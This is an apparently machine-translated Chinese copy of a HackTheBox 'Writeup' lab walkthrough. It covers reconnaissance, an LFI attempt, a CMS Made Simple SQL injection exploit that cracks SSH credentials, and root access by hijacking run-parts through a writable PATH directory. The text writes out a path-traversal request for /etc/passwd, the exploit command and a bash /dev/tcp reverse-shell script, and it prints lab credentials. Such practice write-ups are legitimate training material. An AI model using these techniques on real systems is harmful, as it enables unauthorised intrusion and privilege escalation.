<html>
<head>
<title>HacktheBox — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox —记录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-writeup-2978c1639fb4?source=collection_archive---------0-----------------------#2019-10-12">https://infosecwriteups.com/hackthebox-writeup-2978c1639fb4?source=collection_archive---------0-----------------------#2019-10-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b661" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何从HacktheBox解决Writeup的文章。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/bcc4e493db3eaf6d0c4877cc4c99fc80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*wc1eU9Aerqx6TdyeMSmfbA.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://www.hackthebox.eu/home/machines/profile/192" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/192</a></figcaption></figure><p id="1d2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="e893" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><h1 id="b508" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">关于盒子:</h1><p id="4555" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">Writeup是HacktheBox上的简易评级机。这是一个相对简单的盒子，向您介绍$PATH劫持的概念。为了获取用户，我利用CMS制造简单漏洞来获取SSH的凭证。然后，我创建了一个脚本，其中run-parts被设置为run，当有人SSH进入该框时就会执行该脚本。</p><h1 id="715e" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">侦察:</h1><p id="da34" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我首先通过调用命令运行初始nmap扫描，将其保存到我的nmap目录:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="f89c" class="mg kz iq mc b gy mh mi l mj mk">nmap -sV -sC -oA nmap/initial 10.10.10.138</span></pre><p id="8173" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/129ca13bd855fe61d1667ec005a0d110.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6f0ffr--8jOUUHAaPxdj9g.png"/></div></div></figure><p id="18b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我检查http和robots.txt:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/172f9608d827a48bc6437e6eccfc913a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*1iFpMwmK5-z5aoyjOvBDdg.png"/></div></figure><p id="9970" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在网页中，一个横幅暗示有某种类型的DoS保护。这意味着我们不能在没有预防措施的情况下对目录进行强制或模糊处理。另外，请注意writeup.htb域。我可以将它添加到我的/etc/hosts中，检查机器上是否实现了某种类型的<a class="ae kx" href="https://httpd.apache.org/docs/2.4/vhosts/examples.html" rel="noopener ugc nofollow" target="_blank">虚拟主机</a>。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/476e91d85a9fb3423dda8b23b4317a6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*OOwvXE9YWsQpWZOvf-lR_g.png"/></div></figure><p id="3832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向下滚动页面，我可以注意到可能有一个备份文件，我们以后可以使用。</p><h2 id="b74b" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated">检查机器人. txt</h2><p id="8d28" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">查<a class="ae kx" href="https://en.wikipedia.org/wiki/Robots_exclusion_standard" rel="noopener ugc nofollow" target="_blank"> robots.txt </a>，有一个目录叫“writeup”。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/557fc12454ce134b88408ec00c64960f.png" data-original-src="https://miro.medium.com/v2/resize:fit:850/format:webp/1*LXjob2z-Nl-9TAt00suhrg.png"/></div></div></figure><p id="ef39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本上，标记为不允许的内容可以防止搜索引擎等网络爬虫在这些目录/文件上“爬行”。访问/writeup并检查其来源，它使用了一个名为CMS Made Simple的内容管理系统。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ne"><img src="../Images/52c7727cbc56b4c6328c8e5221041e31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fIjy7VyUq5E1BM9llNr6Iw.png"/></div></div></figure><h2 id="2e5c" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated"><strong class="ak"> CMS制作简单</strong></h2><p id="34e7" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">检查URL，页面参数等于取决于你访问的文章的名称</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nf"><img src="../Images/648f9f28b3f38d4dbd64aff2a0bcbb7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zxR-TW4UjczsKTnpOe96WA.png"/></div></div></figure><p id="69d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试在页面参数上设置一个公共LFI</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="4183" class="mg kz iq mc b gy mh mi l mj mk">view-source:<a class="ae kx" href="http://10.10.10.138/writeup/index.php?page=../../../../../../../../etc/passwd" rel="noopener ugc nofollow" target="_blank">http://10.10.10.138/writeup/index.php?page=../../../../../../../../etc/passwd</a></span></pre><p id="bb31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/ab925eccb7828cd66e2f37afb6422e31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*0UAoDPkvIY3MPCloxGXjEw.png"/></div></figure><h1 id="2e59" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated"><strong class="ak">获取用户</strong></h1><p id="8670" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">看到它不起作用，我决定继续前进。由于我看到了CMS的使用，我检查searchsploit来检查是否有我可以利用的漏洞。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nh"><img src="../Images/a79f0dc86ea89cd931c3b4859be4c680.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vAX-MJmtrF5CLjGcLCATRA.png"/></div></div></figure><p id="d3f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为有很多漏洞，所以我决定在网上查找最近的漏洞，然后发现了这个:</p><p id="7b80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html" rel="noopener ugc nofollow" target="_blank">https://packets storm security . com/files/152356/CMS-Made-Simple-SQL-injection . html</a></p><p id="0abb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到这个漏洞也列在searchsploit结果中，我将它复制到我的工作目录中进行尝试。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ni"><img src="../Images/67615974f01f03c8c9f5d99779637ea9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5l2_m-q69XFs9a2uE_SfnQ.png"/></div></div></figure><p id="3f8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查其用法:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="5a5f" class="mg kz iq mc b gy mh mi l mj mk">root@kali:~/Documents/htb/boxes/writeup/new# python exploit.py <br/>[+] Specify an url target<br/>[+] Example usage (no cracking password): exploit.py -u <a class="ae kx" href="http://target-uri" rel="noopener ugc nofollow" target="_blank">http://target-uri</a><br/>[+] Example usage (with cracking password): exploit.py -u <a class="ae kx" href="http://target-uri" rel="noopener ugc nofollow" target="_blank">http://target-uri</a> --crack -w /path-wordlist<br/>[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.</span></pre><p id="fcaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于该漏洞是基于时间的盲SQL注入，我记下了时间，以便在需要时进行调整:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nj"><img src="../Images/597503767f7018d0f8b9508f66e42043.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DkUjh9Jh7YMRXF02eLWE4g.png"/></div></div></figure><p id="15eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">按照它的用法，我然后尝试利用:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="ff17" class="mg kz iq mc b gy mh mi l mj mk">python exploit.py -u <a class="ae kx" href="http://10.10.10.138/writeup" rel="noopener ugc nofollow" target="_blank">http://10.10.10.138/writeup</a> --crack -w /usr/share/wordlists/rockyou.txt</span></pre><p id="ed3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/cf087c99f004752a95931d00e15a560a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1062/format:webp/1*8pbZp4XIIzdvwOq0IsX-TQ.png"/></div></figure><p id="4049" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用用户名<strong class="jp ir"> jkr </strong>和密码<strong class="jp ir"> raykayjay9 </strong>，我试着SSH进入这个盒子，它成功了:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nl"><img src="../Images/56520d61158cbfe555567b742990d644.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EEZ5a-Ubj6513LT8ktmWMQ.png"/></div></div></figure><h1 id="5b62" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">获取根</h1><p id="e3e0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">然后我检查SUID二进制文件:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="7b8d" class="mg kz iq mc b gy mh mi l mj mk">jkr@writeup:/home$ find / -perm -u=s -type f 2&gt;/dev/null<br/>/bin/su<br/>/bin/mount<br/>/bin/ping<br/>/bin/umount<br/>/usr/bin/gpasswd<br/>/usr/bin/pkexec<br/>/usr/bin/chfn<br/>/usr/bin/passwd<br/>/usr/bin/newgrp<br/>/usr/bin/chsh<br/>/usr/lib/eject/dmcrypt-get-device<br/>/usr/lib/policykit-1/polkit-agent-helper-1<br/>/usr/lib/openssh/ssh-keysign<br/>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br/>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br/>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></pre><p id="f1c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为没有什么特别的，所以我运行ps aux，看到一个cleanup.pl文件以UID=0运行，这意味着该进程是由root运行的。然后，我使用pspy64监控后台运行的进程:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nm"><img src="../Images/789bf30f382d26ad9cde332bee1aa212.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BM_4lEXcayhKPfDSAPIs0A.png"/></div></div></figure><p id="75d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我最初解决这台机器时，我在免费服务器上。运行pspy64时，我看到有一个run-parts二进制文件由root运行。</p><h2 id="082e" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated">运转零件</h2><p id="0630" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">基本上，run-parts在一个目录中运行脚本或程序。因为它运行/etc/update-motd.d目录下的文件，所以我尝试编写一个脚本，如果它被执行，它将ping我。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nn"><img src="../Images/5b96116ce908437e8be57a4ea1e0178f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x86aWT46p8OichgkbUu-XQ.png"/></div></div></figure><p id="279d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我没有写权限，所以我试着分解并理解这一行:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="fef9" class="mg kz iq mc b gy mh mi l mj mk">sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd<br/>.d &gt; /run/motd.dynamic.new</span></pre><blockquote class="no np nq"><p id="8df5" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">sh -c:运行命令，在本例中是/usr/bin/env</p><p id="c532" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">env:在修改后的环境中运行程序，其中-i表示在空环境中启动，为PATH的设置让路</p><p id="c19e" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">PATH=/usr/local/sbin。。。:将/usr/local/sbin设置为运行不带前缀的命令时的优先搜索位置。/，最后一个选项是/bin</p><p id="76c3" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">run-parts:在它后面的目录下运行脚本，在本例中是/etc/update-motd.d，将其输出管道化到/run/motd.dynamic.new</p><p id="6aff" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">lsbsysinit:基本上表示脚本名称不能以结尾。dpkg-旧的或。dpkg-dist or。dpkg-新的或。dpkg-tmp</p></blockquote><p id="d318" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以每次我SSH的时候，上面的脚本都会被执行。因为/usr/local/sbin被设置为优先路径，所以我试着写一个文件/usr/local/sbin/我首先尝试使用一个执行ping命令的脚本:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="fb37" class="mg kz iq mc b gy mh mi l mj mk">#!/bin/bash</span><span id="3082" class="mg kz iq mc b gy nv mi l mj mk">ping -c 2 10.10.14.33</span></pre><p id="3375" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在下面的截图中看到，我能够从writeup.htb(10.10.10.138)获得ping。这表明我有命令执行。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nw"><img src="../Images/316b1650dff809e382a122cf6657c01c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5n-6oDznLdtT-z1a1C9gMg.png"/></div></div></figure><p id="4d00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我编辑运行部分的内容:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="a35d" class="mg kz iq mc b gy mh mi l mj mk">#!/bin/bash</span><span id="2b5c" class="mg kz iq mc b gy nv mi l mj mk">bash -i &gt;&amp; /dev/tcp/10.10.14.33/9001 0&gt;&amp;1</span></pre><p id="4632" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置我的监听器:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="c062" class="mg kz iq mc b gy mh mi l mj mk">ncat -nlvp 9001</span></pre><p id="2dcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将运行部分脚本复制到/usr/local/sbin/:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="476b" class="mg kz iq mc b gy mh mi l mj mk">cp run-parts /usr/local/sbin/run-parts</span></pre><p id="b02d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我进入盒子后，我得到了一个外壳:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nx"><img src="../Images/c42086a7eb6f8c9c4c63a6f28f4c7816.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ra6tYCZXBPZjC3zeW4hCrA.png"/></div></div></figure><p id="a307" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在可以读root.txt了..</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="ecbe" class="mg kz iq mc b gy mh mi l mj mk">root@writeup:/root# cat root.txt<br/>cat root.txt<br/><strong class="mc ir">eeba47f60....</strong></span></pre><p id="91c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还检查了/root/bin下的cleanup.pl脚本:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ny"><img src="../Images/62d9b2f25cef1b3e9c63af3d415d61e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e8XJkNAAi0lZr5OOcuxhVg.png"/></div></div></figure><p id="d49a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个避免剧透的清理脚本。请注意，在长脚本之后有一个run-parts—lsbsysinit/etc/update/motd . d。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nz"><img src="../Images/abc2eb78d6017d9552a447bda9254795.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WfGjdjmIktaYWAaAwO6w9w.png"/></div></div></figure><p id="767f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分解一下，我还查了什么是/etc/update-motd.d:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="908e" class="mg kz iq mc b gy mh mi l mj mk">Executable scripts in /etc/update-motd.d/* are executed by <a class="ae kx" href="http://manpages.ubuntu.com/manpages/disco/en/man8/pam_motd.8.html" rel="noopener ugc nofollow" target="_blank"><strong class="mc ir">pam_motd</strong></a>(8) as the root user at each  login,  and  this  information  is  concatenated in /run/motd.dynamic.  The order of script  execution  is  determined  by  the  <a class="ae kx" href="http://manpages.ubuntu.com/manpages/disco/en/man8/run-parts.8.html" rel="noopener ugc nofollow" target="_blank"><strong class="mc ir">run-parts</strong></a>(8)  --lsbsysinit  option  (basically alphabetical order, with a few caveats).</span></pre><p id="8242" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其中pam_motd为:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="a496" class="mg kz iq mc b gy mh mi l mj mk">pam_motd is a PAM module that can be used to display arbitrary motd (message of the day)files after a successful login.</span></pre><p id="7856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就解释了为什么我每次进入盒子都会触发这些。</p><p id="0f79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何从黑盒子开始写盒子的。我希望你能从这次演练中学到一些东西。干杯！🍺</p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="aefb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nr">关注</em> <a class="ae kx" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nr"> Infosec报道</em> </a> <em class="nr">获取更多此类精彩报道。</em></p><div class="oh oi gp gr oj ok"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ol ab fo"><div class="om ab on cl cj oo"><h2 class="bd ir gy z fp op fr fs oq fu fw ip bi translated">信息安全报道</h2><div class="or l"><h3 class="bd b gy z fp op fr fs oq fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="os l"><p class="bd b dl z fp op fr fs oq fu fw dk translated">medium.com</p></div></div><div class="ot l"><div class="ou l ov ow ox ot oy kr ok"/></div></div></a></div></div></div>    
</body>
</html>